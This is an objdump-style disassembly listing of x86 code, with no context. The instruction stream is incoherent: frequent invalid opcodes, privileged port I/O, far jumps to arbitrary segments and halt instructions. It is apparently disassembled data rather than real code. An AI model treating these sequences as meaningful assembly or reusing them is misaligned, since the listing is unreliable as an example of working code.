  40a2f1:	loopne 0x40a331
  40a2f3:	pop    es
  40a2f4:	bswap  ebp
  40a2f6:	sbb    BYTE PTR [eax-0x6bbc3472],0x6
  40a2fd:	cdq    
  40a2fe:	in     eax,0x2e
  40a300:	dec    eax
  40a301:	cmp    al,BYTE PTR [ebp+0x2aafda19]
  40a307:	lods   al,BYTE PTR ds:[esi]
  40a308:	in     al,0xfc
  40a30a:	sti    
  40a30b:	push   ebx
  40a30c:	mov    BYTE PTR [eax-0x40],bl
  40a30f:	pop    esp
  40a310:	iret   
  40a311:	lea    ebp,[ecx]
  40a313:	cwde   
  40a314:	cdq    
  40a315:	out    dx,al
  40a316:	outs   dx,BYTE PTR ds:[esi]
  40a317:	ror    dh,0x42
  40a31a:	xchg   ecx,eax
  40a31b:	ja     0x40a353
  40a31d:	pop    es
  40a31e:	aas    
  40a31f:	add    eax,0xbae2053
  40a324:	jne    0x40a343
  40a326:	pop    edx
  40a327:	test   BYTE PTR [edi-0x47],0xd7
  40a32b:	(bad)  
  40a32d:	or     eax,0xe56a3b27
  40a332:	sbb    eax,0xaad81be8
  40a337:	sti    
  40a338:	push   es
  40a339:	or     esp,DWORD PTR [ebx-0xcafcf81]
  40a33f:	xchg   ecx,eax
  40a340:	sahf   
  40a341:	and    edx,esp
  40a343:	mov    ah,0x24
  40a345:	in     eax,dx
  40a346:	sbb    bh,BYTE PTR [ebx+eiz*1]
  40a349:	enter  0x149f,0x66
  40a34d:	push   ss
  40a34e:	adc    DWORD PTR [eax+0x76fd8bbe],ebp
  40a354:	sbb    BYTE PTR ds:0xa34fcbfb,0x96
  40a35b:	push   edi
  40a35c:	pushf  
  40a35d:	jns    0x40a305
  40a35f:	fmul   st,st(7)
  40a361:	push   ebp
  40a362:	mov    eax,edi
  40a364:	dec    esi
  40a365:	jle    0x40a365
  40a367:	test   al,0xd5
  40a369:	std    
  40a36a:	lea    ecx,[eax]
  40a36c:	scas   eax,DWORD PTR es:[edi]
  40a36d:	int    0x22
  40a36f:	add    eax,0xa9179588
  40a374:	in     al,0x1
  40a376:	xchg   ecx,eax
  40a377:	jo     0x40a325
  40a379:	ja     0x40a3b5
  40a37b:	ret    
  40a37c:	or     BYTE PTR [ebp+0xf],cl
  40a37f:	out    dx,eax
  40a380:	push   ebp
  40a381:	inc    edx
  40a382:	inc    ebx
  40a383:	int3   
  40a384:	pop    esp
  40a385:	or     dl,BYTE PTR [ecx-0x50]
  40a388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a389:	cld    
  40a38a:	pop    edx
  40a38b:	inc    ebp
  40a38c:	add    ecx,DWORD PTR [ebp-0x3f]
  40a38f:	jnp    0x40a378
  40a391:	xchg   ebx,eax
  40a392:	inc    edx
  40a393:	pop    edx
  40a394:	xchg   ecx,eax
  40a395:	dec    edi
  40a396:	(bad)  
  40a397:	div    BYTE PTR [ebx-0x75]
  40a39a:	test   al,0x4b
  40a39c:	xor    al,0xe8
  40a39e:	out    dx,eax
  40a39f:	mov    DWORD PTR [edi+0x6c],ebx
  40a3a2:	xor    DWORD PTR [esi+0x735c247e],edx
  40a3a8:	cwde   
  40a3a9:	ja     0x40a3e3
  40a3ab:	imul   eax,ebx,0x52
  40a3ae:	push   ebx
  40a3af:	xchg   esp,eax
  40a3b0:	rol    DWORD PTR [ebx-0x6],1
  40a3b3:	dec    eax
  40a3b4:	enter  0x3157,0xfd
  40a3b8:	loopne 0x40a3d2
  40a3ba:	sub    eax,0xbf0514bb
  40a3bf:	call   0x4d99:0x67a0470
  40a3c6:	or     al,ah
  40a3c8:	dec    ebp
  40a3c9:	and    al,0xc2
  40a3cb:	and    DWORD PTR [edx-0x35e53fe2],edx
  40a3d1:	mov    dh,0x8c
  40a3d3:	loopne 0x40a3f8
  40a3d5:	push   eax
  40a3d6:	gs sahf 
  40a3d8:	sub    al,0x52
  40a3da:	mov    fs,WORD PTR [ecx+ebx*1]
  40a3dd:	cli    
  40a3de:	sub    al,0x8e
  40a3e0:	mov    al,ds:0x959cca07
  40a3e5:	jbe    0x40a40a
  40a3e7:	sub    ch,BYTE PTR [edi-0x67ef4ec8]
  40a3ed:	pop    DWORD PTR [ecx+0x93a2955]
  40a3f3:	sar    edx,1
  40a3f5:	je     0x40a3ea
  40a3f7:	xchg   BYTE PTR [edi+ebp*4-0x1],cl
  40a3fb:	sbb    eax,DWORD PTR [ecx-0x703b89d3]
  40a401:	in     al,dx
  40a402:	ds clc 
  40a404:	pop    ecx
  40a405:	inc    ebx
  40a406:	gs jb  0x40a40e
  40a409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a40a:	aad    0x0
  40a40c:	push   0x1764fc99
  40a411:	push   ss
  40a412:	iret   
  40a413:	mov    ah,0xbd
  40a415:	xchg   ecx,eax
  40a416:	push   esp
  40a417:	out    dx,eax
  40a418:	push   0x58
  40a41a:	inc    edi
  40a41b:	mov    esi,0x9478ab88
  40a420:	into   
  40a421:	lods   eax,DWORD PTR ds:[esi]
  40a422:	cmp    al,0x62
  40a424:	sbb    esi,DWORD PTR [esi]
  40a426:	pop    ebx
  40a427:	inc    ecx
  40a428:	lahf   
  40a429:	clc    
  40a42a:	loopne 0x40a444
  40a42c:	mov    esi,0xfe6ecd47
  40a431:	xchg   esi,eax
  40a432:	pop    edx
  40a433:	mov    BYTE PTR [esi],dl
  40a435:	test   BYTE PTR [esi-0x75],cl
  40a438:	mov    esp,0xe9b7ca6d
  40a43d:	jnp    0x40a43d
  40a43f:	ins    DWORD PTR es:[edi],dx
  40a440:	push   ebx
  40a441:	sbb    DWORD PTR [ebx-0x46b5f8ae],edx
  40a447:	or     eax,0x5edb2fc9
  40a44c:	sub    DWORD PTR [ebx-0x4cc1d6d1],esp
  40a452:	mov    dh,0x7
  40a454:	scas   al,BYTE PTR es:[edi]
  40a455:	pop    ecx
  40a456:	or     ebp,eax
  40a458:	dec    esi
  40a459:	pop    esi
  40a45a:	sti    
  40a45b:	jp     0x40a424
  40a45d:	adc    bl,BYTE PTR [ebx+0x1f1b77dc]
  40a463:	into   
  40a464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a465:	(bad)  
  40a467:	push   cs
  40a468:	push   ebx
  40a469:	push   cs
  40a46a:	pop    ss
  40a46b:	nop
  40a46c:	jne    0x40a4c3
  40a46e:	pop    esi
  40a46f:	or     edx,esi
  40a471:	es push esi
  40a473:	push   es
  40a474:	mov    esi,0x5408ecb1
  40a479:	xchg   esp,eax
  40a47a:	add    ecx,ecx
  40a47c:	push   edx
  40a47d:	fs jmp 0x40a421
  40a480:	or     DWORD PTR [ecx-0x17],esi
  40a483:	or     eax,0xb8360431
  40a488:	(bad)  
  40a489:	lock mov al,0x14
  40a48c:	xor    esp,DWORD PTR ds:0x4a59290d
  40a492:	lea    eax,[eax]
  40a494:	das    
  40a495:	(bad)  
  40a496:	sahf   
  40a497:	sub    ebp,edx
  40a499:	sbb    ch,BYTE PTR [esi+0x460382d5]
  40a49f:	inc    ebx
  40a4a0:	(bad)  
  40a4a1:	jl     0x40a4b5
  40a4a3:	cs xor al,0x64
  40a4a6:	clc    
  40a4a7:	cmp    ebp,0xb839ab7b
  40a4ad:	cs addr16 (bad) 
  40a4b0:	imul   edi,DWORD PTR [esi-0x24095ef9],0x64
  40a4b7:	push   edi
  40a4b8:	(bad)  
  40a4b9:	es add al,0xa0
  40a4bc:	iret   
  40a4bd:	xor    DWORD PTR [eax-0x1c0b1175],ebx
  40a4c3:	push   edx
  40a4c4:	pop    ds
  40a4c5:	sahf   
  40a4c6:	scas   eax,DWORD PTR es:[edi]
  40a4c7:	mov    edx,0xaf920582
  40a4cc:	jbe    0x40a53e
  40a4ce:	ins    DWORD PTR es:[edi],dx
  40a4cf:	jmp    0x531a99c4
  40a4d4:	fadd   DWORD PTR [ebx+ebp*2]
  40a4d7:	dec    ecx
  40a4d8:	cli    
  40a4d9:	aam    0x6f
  40a4db:	daa    
  40a4dc:	gs or  eax,0xf46eef3e
  40a4e2:	push   0xffffffe0
  40a4e4:	dec    esi
  40a4e5:	lock les ebx,FWORD PTR [edx-0x7c]
  40a4e9:	adc    al,0xf6
  40a4eb:	sbb    BYTE PTR [ebp+0x1975e393],bh
  40a4f1:	lock cmp edx,DWORD PTR [ebp+0x17]
  40a4f5:	dec    ebp
  40a4f6:	push   esi
  40a4f7:	mov    ebx,esp
  40a4f9:	mov    ebx,DWORD PTR [ebx+0x41393910]
  40a4ff:	xchg   ecx,eax
  40a500:	mov    bh,ah
  40a502:	jp     0x40a51d
  40a504:	pusha  
  40a505:	sahf   
  40a506:	cmp    dl,BYTE PTR [ecx]
  40a508:	pop    edi
  40a509:	or     al,0x9d
  40a50b:	stos   BYTE PTR es:[edi],al
  40a50c:	jo     0x40a4b8
  40a50e:	out    0x43,eax
  40a510:	aaa    
  40a511:	(bad)  
  40a512:	ror    ecx,cl
  40a514:	pop    esp
  40a515:	ds dec ecx
  40a517:	mov    ah,0xa1
  40a519:	adc    cl,BYTE PTR [edi+0x3d]
  40a51c:	(bad)  
  40a51d:	pop    ebp
  40a51e:	dec    edi
  40a51f:	xchg   edi,edx
  40a521:	ds (bad) 
  40a523:	fucomip st,st(7)
  40a525:	and    DWORD PTR [edi+eax*4],ecx
  40a528:	repz add BYTE PTR [ebp-0x59],ah
  40a52c:	(bad)  
  40a52d:	arpl   WORD PTR [esi-0x5e2b44f5],cx
  40a533:	(bad)  
  40a534:	fimul  DWORD PTR [esi+0x7]
  40a537:	test   BYTE PTR [edi],bl
  40a539:	jg     0x40a518
  40a53b:	jmp    0x9aab:0x5784972a
  40a542:	xor    ebx,edx
  40a544:	(bad)  
  40a545:	sub    ch,0xfe
  40a548:	mov    ds:0x29d28beb,al
  40a54d:	mov    ebx,0x1e2193f4
  40a552:	xchg   DWORD PTR [ebx-0x38149d72],edx
  40a558:	jno    0x40a5cb
  40a55a:	outs   dx,BYTE PTR ds:[esi]
  40a55b:	or     ebx,DWORD PTR [esi+ecx*8]
  40a55e:	cmp    al,0xdb
  40a560:	push   ss
  40a561:	fnsave [ebp+eiz*2+0x11a15d5]
  40a568:	fwait
  40a569:	sbb    BYTE PTR ds:0xde6e3410,ah
  40a56f:	fs add al,0x4f
  40a572:	loopne 0x40a522
  40a574:	jns    0x40a516
  40a576:	sbb    eax,0xfbcaa977
  40a57b:	mov    edx,0x6ded00fe
  40a580:	jmp    0xd57:0x31033cf5
  40a587:	xchg   esi,eax
  40a588:	lea    esp,[ebx+0x30079b88]
  40a58e:	hlt    
  40a58f:	das    
  40a590:	inc    ebx
  40a591:	inc    eax
  40a592:	xchg   edx,eax
  40a593:	pop    ecx
  40a594:	xchg   ebx,eax
  40a595:	sahf   
  40a596:	sbb    DWORD PTR [eax-0x71],esi
  40a599:	jne    0x40a562
  40a59b:	fadd   QWORD PTR [ebp-0x4f]
  40a59e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a59f:	ins    DWORD PTR es:[edi],dx
  40a5a0:	jno    0x40a5bc
  40a5a2:	not    DWORD PTR [ebp-0x5100782c]
  40a5a8:	xor    al,0xf2
  40a5aa:	add    eax,0x46c6ed9e
  40a5af:	mov    DWORD PTR [ebx-0xf],edi
  40a5b2:	mov    dl,0x6c
  40a5b4:	cwde   
  40a5b5:	push   edi
  40a5b6:	aad    0x77
  40a5b8:	sar    DWORD PTR [ebp+0x4c],cl
  40a5bb:	lahf   
  40a5bc:	or     al,0x4f
  40a5be:	idiv   BYTE PTR [edx]
  40a5c0:	shl    BYTE PTR [ebx+eiz*4+0x6c94bbd5],cl
  40a5c7:	mov    ecx,ebx
  40a5c9:	(bad)  [ebx+eiz*2+0x7564772e]
  40a5d0:	rcl    BYTE PTR [eax],0x1a
  40a5d3:	stos   BYTE PTR es:[edi],al
  40a5d4:	inc    esi
  40a5d5:	call   0x374af86e
  40a5da:	mov    edi,0x66a80118
  40a5df:	retf   0xd176
  40a5e2:	push   ds
  40a5e3:	mov    esp,0x55aad075
  40a5e8:	sub    esi,ebp
  40a5ea:	out    0x62,eax
  40a5ec:	lods   al,BYTE PTR ds:[esi]
  40a5ed:	ror    BYTE PTR [ebx],0x6f
  40a5f0:	arpl   WORD PTR [ebp-0x5ac5128f],bx
  40a5f6:	sub    al,0x9c
  40a5f8:	mov    dl,0xd7
  40a5fa:	dec    ecx
  40a5fb:	leave  
  40a5fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5fd:	jle    0x40a593
  40a5ff:	or     eax,0x725a21a
  40a604:	ds push cs
  40a606:	push   edi
  40a607:	gs push edi
  40a609:	mov    ?,ebx
  40a60b:	ins    DWORD PTR es:[edi],dx
  40a60c:	sub    DWORD PTR [ecx],eax
  40a60e:	sub    al,0xaa
  40a610:	adc    eax,0x8356138a
  40a615:	out    dx,al
  40a616:	push   eax
  40a617:	and    eax,0xe457f3ef
  40a61c:	push   eax
  40a61d:	jp     0x40a5c0
  40a61f:	fisubr WORD PTR [edi+eax*1]
  40a622:	mov    ebp,0xb76fa788
  40a627:	adc    ch,BYTE PTR [ecx+0x2e85d541]
  40a62d:	jo     0x40a63d
  40a62f:	add    bl,BYTE PTR [eax-0x807f21f]
  40a635:	in     al,0x2f
  40a637:	xchg   esp,eax
  40a638:	or     DWORD PTR [edi-0x44],0xa9ff956c
  40a63f:	loope  0x40a605
  40a641:	sub    eax,0xb72d2eb2
  40a646:	mov    edi,0x37247782
  40a64b:	leave  
  40a64c:	(bad)  
  40a64d:	ds clc 
  40a64f:	(bad)  [esi+0x71]
  40a652:	xchg   DWORD PTR [eax],esi
  40a654:	cwde   
  40a655:	shl    BYTE PTR [ebx+0x2e3ea360],1
  40a65b:	add    DWORD PTR [ebp+edi*8-0x10],ebx
  40a65f:	fwait
  40a660:	scas   eax,DWORD PTR es:[di]
  40a662:	push   ds
  40a663:	push   cs
  40a664:	cmp    BYTE PTR [eax-0xc],0x94
  40a668:	sub    cl,bh
  40a66a:	mov    al,0x9d
  40a66c:	(bad)  
  40a66d:	icebp  
  40a66e:	(bad)  
  40a66f:	cli    
  40a670:	loopne 0x40a68e
  40a672:	test   al,0xed
  40a674:	push   ebx
  40a675:	sub    DWORD PTR [ecx],edx
  40a677:	je     0x40a653
  40a679:	(bad)  
  40a67a:	sub    BYTE PTR [ecx-0xbde2cd0],ah
  40a680:	aas    
  40a681:	adc    dl,ch
  40a683:	add    al,0x24
  40a685:	not    edi
  40a687:	xor    al,0xa8
  40a689:	add    eax,0x1f1c713f
  40a68e:	nop
  40a68f:	jbe    0x40a67b
  40a691:	hlt    
  40a692:	je     0x40a6f1
  40a694:	jne    0x40a697
  40a696:	push   esi
  40a697:	xchg   esp,eax
  40a698:	mov    edx,esp
  40a69a:	das    
  40a69b:	mov    dl,0x41
  40a69d:	mov    dh,0x94
  40a69f:	and    DWORD PTR [eax],eax
  40a6a1:	push   esp
  40a6a2:	xchg   edi,eax
  40a6a3:	in     eax,dx
  40a6a4:	fdiv   DWORD PTR [edi-0x72]
  40a6a7:	push   cs
  40a6a8:	and    edx,edi
  40a6aa:	push   ebp
  40a6ab:	sub    BYTE PTR [eax+ebp*4+0x48],dl
  40a6af:	mov    bl,0xcc
  40a6b1:	dec    ebp
  40a6b2:	cwde   
  40a6b3:	pushf  
  40a6b4:	mov    dh,0x62
  40a6b6:	rol    BYTE PTR [edi+0x51],cl
  40a6b9:	cmp    cl,BYTE PTR [edi+ebp*1]
  40a6bc:	fwait
  40a6bd:	sti    
  40a6be:	addr16 push esp
  40a6c0:	sbb    al,0xee
  40a6c2:	fld    QWORD PTR [ecx-0x67fab50d]
  40a6c8:	cld    
  40a6c9:	push   eax
  40a6ca:	retf   0x5d9c
  40a6cd:	cmp    cl,BYTE PTR [ebx-0x4c81506]
  40a6d3:	hlt    
  40a6d4:	loopne 0x40a65c
  40a6d6:	or     al,BYTE PTR [ecx+ecx*2-0x72ab56b0]
  40a6dd:	shl    ebp,0xfe
  40a6e0:	or     DWORD PTR [eax+0x138b5b5c],ebp
  40a6e6:	and    ah,BYTE PTR [edi+0x5f5cc0fb]
  40a6ec:	dec    esi
  40a6ed:	dec    ebp
  40a6ee:	leave  
  40a6ef:	neg    BYTE PTR [edi-0x4d]
  40a6f2:	fwait
  40a6f3:	enter  0xd2eb,0xc6
  40a6f7:	and    esp,edi
  40a6f9:	(bad)  
  40a6fa:	xchg   ebp,eax
  40a6fb:	(bad)  
  40a6fc:	sbb    BYTE PTR [ebx+0x78],cl
  40a6ff:	ins    DWORD PTR es:[edi],dx
  40a700:	pop    ebx
  40a701:	ror    DWORD PTR [eax+esi*1+0x1f4bd1ed],0x9d
  40a709:	imul   edx,eax,0x40
  40a70c:	xor    bh,ch
  40a70e:	ds sbb al,0x1
  40a711:	and    BYTE PTR [ebx+eax*2],bh
  40a714:	inc    esp
  40a715:	into   
  40a716:	add    ch,BYTE PTR [ecx]
  40a718:	push   es
  40a719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a71a:	shl    ecx,cl
  40a71c:	add    eax,DWORD PTR [ebx+edi*4-0x461b52ca]
  40a723:	inc    esp
  40a724:	adc    eax,0xf3854d67
  40a729:	dec    edi
  40a72a:	xchg   BYTE PTR [edx],ah
  40a72c:	cwde   
  40a72d:	pop    ds
  40a72e:	mov    es,WORD PTR [eax]
  40a730:	in     al,0x4e
  40a732:	sti    
  40a733:	loop   0x40a748
  40a735:	les    ecx,FWORD PTR [edx]
  40a737:	xchg   ebp,eax
  40a738:	test   eax,0x4abb20a4
  40a73d:	mov    al,ds:0xc434834
  40a742:	jb     0x40a795
  40a744:	outs   dx,BYTE PTR ds:[esi]
  40a745:	mov    bl,dl
  40a747:	jmp    0x4ce3:0xa727a760
  40a74e:	mov    al,ds:0xe98835ee
  40a753:	or     al,0x53
  40a755:	ret    0x3b76
  40a758:	or     DWORD PTR [edx],ebp
  40a75a:	mov    cs,WORD PTR [eax-0x5e752bcd]
  40a760:	or     DWORD PTR [ecx+eax*4],0x9c62c884
  40a767:	mov    ebx,0xfa7b5120
  40a76c:	adc    al,0xce
  40a76e:	shl    BYTE PTR [edx+0x9],1
  40a771:	sahf   
  40a772:	loopne 0x40a712
  40a774:	hlt    
  40a775:	or     ch,BYTE PTR ds:0x6f8e7d48
  40a77b:	jmp    0x43bf:0xa100aecc
  40a782:	dec    eax
  40a783:	fisttp DWORD PTR [ecx]
  40a785:	(bad)  
  40a786:	push   ebp
  40a787:	sub    bl,ah
  40a789:	xor    al,0x47
  40a78b:	jo     0x40a7ad
  40a78d:	stos   DWORD PTR es:[edi],eax
  40a78e:	in     eax,dx
  40a78f:	mov    WORD PTR [eax-0x3161e08f],ss
  40a795:	mov    DWORD PTR ss:[esi],ebx
  40a798:	xchg   edi,eax
  40a799:	mov    bl,0xff
  40a79b:	pop    esi
  40a79c:	call   0x459d:0xd0f401f4
  40a7a3:	lahf   
  40a7a4:	jae    0x40a732
  40a7a6:	out    dx,eax
  40a7a7:	sbb    ebp,esi
  40a7a9:	(bad)
  40a7ac:	inc    esi
  40a7ad:	sub    eax,0xae57a7bf
  40a7b2:	fmul   DWORD PTR [ebx+eiz*8+0xb79b47a]
  40a7b9:	(bad)  
  40a7ba:	arpl   WORD PTR [ebx+0x6f5c22ba],di
  40a7c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7c1:	pushf  
  40a7c2:	xor    al,0x35
  40a7c4:	mov    edx,0x64d82819
  40a7c9:	pop    DWORD PTR [ecx-0x7]
  40a7cc:	jge    0x40a833
  40a7ce:	or     al,0xed
  40a7d0:	sub    al,0xfc
  40a7d2:	dec    eax
  40a7d3:	ret    
  40a7d4:	test   al,0x15
  40a7d6:	mov    esp,0x3da899b1
  40a7db:	stos   DWORD PTR es:[edi],eax
  40a7dc:	fstp   TBYTE PTR [edi]
  40a7de:	jge    0x40a837
  40a7e0:	dec    edx
  40a7e1:	mov    esi,0xe50ce94b
  40a7e6:	adc    al,0x88
  40a7e8:	add    BYTE PTR [ebp+ecx*4-0x2a],cl
  40a7ec:	jbe    0x40a790
  40a7ee:	ret    
  40a7ef:	push   ebp
  40a7f0:	daa    
  40a7f1:	cld    
  40a7f2:	les    esp,FWORD PTR [eax]
  40a7f4:	fidivr WORD PTR ds:[edi]
  40a7f7:	(bad)  
  40a7f8:	push   ds
  40a7f9:	push   esi
  40a7fa:	imul   edi,DWORD PTR [esi+0x7d08544b],0x5c499dd6
  40a804:	sbb    BYTE PTR [eax+0x5e],0xc5
  40a808:	fsub   st,st(7)
  40a80a:	xor    DWORD PTR [esi],0x9
  40a80d:	(bad)  
  40a80e:	pop    esp
  40a80f:	push   edx
  40a810:	mov    dh,BYTE PTR [edx]
  40a812:	pop    DWORD PTR cs:[edi+ecx*2+0x6]
  40a817:	push   eax
  40a818:	add    DWORD PTR [edi+0x6c],esi
  40a81b:	popf   
  40a81c:	lahf   
  40a81d:	das    
  40a81e:	mov    cl,0xec
  40a820:	xor    DWORD PTR [ebp+0x2c798e34],eax
  40a826:	inc    edx
  40a827:	push   edx
  40a828:	test   eax,0xd8a7d212
  40a82d:	test   bh,bl
  40a82f:	xchg   esi,eax
  40a830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a831:	ins    BYTE PTR es:[edi],dx
  40a832:	sbb    BYTE PTR [eax-0x6f],0x2
  40a836:	imul   edx,DWORD PTR [eax],0xded522cd
  40a83c:	sar    bh,1
  40a83e:	xchg   ebp,eax
  40a83f:	push   ebp
  40a840:	xor    al,0xdf
  40a842:	jmp    0x8b71:0x44f7748f
  40a849:	mov    ch,0x73
  40a84b:	jle    0x40a81e
  40a84d:	mov    ebx,0xcfa6521c
  40a852:	retf   0xf634
  40a855:	jae    0x40a86f
  40a857:	lds    eax,FWORD PTR [edx]
  40a859:	cwde   
  40a85a:	jns    0x40a897
  40a85c:	ins    BYTE PTR es:[edi],dx
  40a85d:	out    dx,eax
  40a85e:	stos   DWORD PTR es:[edi],eax
  40a85f:	or     DWORD PTR [ebp-0x8eec7af],edx
  40a865:	rcl    BYTE PTR [eax-0x9],1
  40a868:	mov    esi,0x502dc53a
  40a86d:	cli    
  40a86e:	dec    edx
  40a86f:	lds    esi,FWORD PTR [ecx-0x305b90d5]
  40a875:	sbb    ch,BYTE PTR [edx-0x12563110]
  40a87b:	test   DWORD PTR [edi+0x30],0x83722baa
  40a882:	dec    esp
  40a883:	repz xlat BYTE PTR ds:[ebx]
  40a885:	in     al,0xd8
  40a887:	mov    ah,0x74
  40a889:	jae    0x40a86a
  40a88b:	fnstsw WORD PTR [ecx]
  40a88d:	cmp    DWORD PTR [ebx],edx
  40a88f:	hlt    
  40a890:	pop    edx
  40a891:	mov    ecx,0x20e13ce3
  40a896:	jne    0x40a886
  40a898:	test   al,0x75
  40a89a:	pop    edx
  40a89b:	pushf  
  40a89c:	loope  0x40a839
  40a89e:	adc    DWORD PTR [esi+edi*4],ebp
  40a8a1:	into   
  40a8a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8a3:	adc    ch,cl
  40a8a5:	push   edi
  40a8a6:	mov    esp,0xc1ccf89b
  40a8ab:	out    0x31,eax
  40a8ad:	mov    DWORD PTR [esi],edi
  40a8af:	or     al,0x91
  40a8b1:	xchg   ebp,eax
  40a8b2:	cmp    eax,0x4a346b9b
  40a8b7:	vaddss xmm6,xmm1,DWORD PTR [ecx-0x6b1e6683]
  40a8bf:	jae    0x40a8ec
  40a8c1:	and    BYTE PTR [eax],0xd5
  40a8c4:	pop    ebx
  40a8c5:	call   0x6acc:0xf4ca7022
  40a8cc:	sub    dl,bh
  40a8ce:	aam    0x63
  40a8d0:	pop    es
  40a8d1:	shl    DWORD PTR [edi+eax*2+0x74],1
  40a8d5:	mov    WORD PTR [ecx-0x4f],ss
  40a8d8:	ret    0x7f01
  40a8db:	sti    
  40a8dc:	out    0xb8,al
  40a8de:	jae    0x40a8dd
  40a8e0:	push   0x51588557
  40a8e5:	ins    DWORD PTR es:[edi],dx
  40a8e6:	jmp    0x43dce99a
  40a8eb:	xchg   BYTE PTR [edi+0x1a96e0f1],ah
  40a8f1:	mov    edx,ebp
  40a8f3:	push   esp
  40a8f4:	mov    ah,0xc3
  40a8f6:	dec    eax
  40a8f7:	in     al,0x55
  40a8f9:	clc    
  40a8fa:	ficomp WORD PTR [edi-0x56d08263]
  40a900:	or     dh,BYTE PTR [ebx-0x1d]
  40a903:	jl     0x40a8d2
  40a905:	ja     0x40a900
  40a907:	repnz test al,0xd0
  40a90a:	push   ebp
  40a90b:	js     0x40a8c8
  40a90d:	mov    ebp,0x44d153a0
  40a912:	mov    dh,0x7c
  40a914:	scas   al,BYTE PTR es:[edi]
  40a915:	jae    0x40a95f
  40a917:	dec    esi
  40a918:	in     al,0x58
  40a91a:	fiadd  WORD PTR [esi+0x5]
  40a91d:	mov    BYTE PTR [esi+0x29],bh
  40a920:	mov    ebp,0xddabd045
  40a925:	ds jp  0x40a9a1
  40a928:	pop    esp
  40a929:	sbb    ecx,0xe8a3bf21
  40a92f:	inc    ebp
  40a930:	aam    0x8f
  40a932:	ror    esi,0xaf
  40a935:	sbb    eax,0x775f52af
  40a93a:	outs   dx,BYTE PTR ds:[esi]
  40a93b:	adc    dl,BYTE PTR [eax]
  40a93d:	and    eax,esi
  40a93f:	mov    al,ds:0xfc924934
  40a944:	cli    
  40a945:	dec    edx
  40a946:	fmul   QWORD PTR [eax-0x2f29cbe8]
  40a94c:	aam    0xd7
  40a94e:	fsubr  QWORD PTR [esi-0x4]
  40a951:	pushf  
  40a952:	xchg   ecx,eax
  40a953:	shl    DWORD PTR [edi+0x5f],cl
  40a956:	mov    ebx,0xeeb2b84f
  40a95b:	cmp    eax,0x1a72c50d
  40a960:	clc    
  40a961:	imul   edi,DWORD PTR ds:0xcaae501f,0xf95e5f5d
  40a96b:	cli    
  40a96c:	shr    bh,0x45
  40a96f:	sbb    eax,0x9b16883f
  40a974:	mov    dh,0x62
  40a976:	(bad)  
  40a977:	adc    DWORD PTR [eax],esp
  40a979:	outs   dx,DWORD PTR ds:[esi]
  40a97a:	int    0xe3
  40a97c:	pushf  
  40a97d:	sub    BYTE PTR [ebx-0x3a0395c2],cl
  40a983:	inc    ebx
  40a984:	outs   dx,DWORD PTR ds:[esi]
  40a985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a986:	popa   
  40a987:	adc    al,0x44
  40a989:	sti    
  40a98a:	mov    ch,0xec
  40a98c:	call   0xafa0:0x94f0367c
  40a993:	pushf  
  40a994:	jb     0x40a9ec
  40a996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a997:	loope  0x40a930
  40a999:	call   0x7443:0x2d5bbb7d
  40a9a0:	adc    ah,cl
  40a9a2:	(bad)  
  40a9a3:	pop    esp
  40a9a4:	cs (bad) 
  40a9a6:	and    bh,bl
  40a9a8:	cdq    
  40a9a9:	push   esi
  40a9aa:	ret    0xaf30
  40a9ad:	mov    bh,0xfa
  40a9af:	push   ebx
  40a9b0:	pop    edi
  40a9b1:	jl     0x40a988
  40a9b3:	loop   0x40aa2c
  40a9b5:	sub    DWORD PTR [eax],0xffffff8c
  40a9b8:	retf   0x92af
  40a9bb:	(bad)  [ebp-0x79]
  40a9be:	jne    0x40a964
  40a9c0:	xchg   esp,eax
  40a9c1:	je     0x40aa2d
  40a9c3:	mov    eax,ds:0xe791d0a3
  40a9c8:	fcom   QWORD PTR [edi+eax*4-0x359112bf]
  40a9cf:	xchg   DWORD PTR [edx+0x79e8f32a],ebx
  40a9d5:	je     0x40a9d9
  40a9d7:	(bad)  
  40a9d8:	sbb    al,BYTE PTR [edx+ebp*1+0x35]
  40a9dc:	aad    0xe
  40a9de:	in     al,dx
  40a9df:	lds    edi,FWORD PTR [edi]
  40a9e1:	sbb    eax,0x7ae856
  40a9e6:	loope  0x40a97e
  40a9e8:	cmc    
  40a9e9:	lea    ebp,[ebp-0x74]
  40a9ec:	(bad)  
  40a9ee:	sub    ch,BYTE PTR [esi-0x29]
  40a9f1:	inc    edi
  40a9f2:	dec    edx
  40a9f3:	in     al,dx
  40a9f4:	shr    edx,0x92
  40a9f7:	sbb    esi,DWORD PTR [edx+edi*1+0x12]
  40a9fb:	in     al,dx
  40a9fc:	pop    ecx
  40a9fd:	mov    al,ds:0xee25674e
  40aa02:	outs   dx,BYTE PTR ds:[esi]
  40aa03:	xchg   DWORD PTR [ecx-0x62],edx
  40aa06:	and    BYTE PTR [eax],al
  40aa08:	fwait
  40aa09:	push   cs
  40aa0a:	mov    ebp,0x7e12a22c
  40aa0f:	(bad)  
  40aa10:	cmp    al,0xb3
  40aa12:	xchg   ebx,eax
  40aa13:	imul   esi,DWORD PTR [eax],0x64
  40aa16:	jo     0x40a9ab
  40aa18:	ret    
  40aa19:	test   eax,0x6e357097
  40aa1e:	in     eax,0xc4
  40aa20:	pushf  
  40aa21:	call   0x4505:0x198a86b5
  40aa28:	sub    ah,dl
  40aa2a:	int3   
  40aa2b:	fs adc esi,ebx
  40aa2e:	fcmove st,st(1)
  40aa30:	jp     0x40a9e5
  40aa32:	pop    esp
  40aa33:	in     al,dx
  40aa34:	fdiv   st(2),st
  40aa36:	pop    esi
  40aa37:	popf   
  40aa38:	scas   eax,DWORD PTR es:[edi]
  40aa39:	test   DWORD PTR [esi-0x21],0xbbd007be
  40aa40:	out    dx,al
  40aa41:	push   esi
  40aa42:	mov    cl,0xb9
  40aa44:	retf   
  40aa45:	sub    eax,0xf2842f45
  40aa4a:	mov    ecx,0xbbb1353c
  40aa4f:	js     0x40a9da
  40aa51:	aaa    
  40aa52:	sub    DWORD PTR [eax+0x1674d810],esi
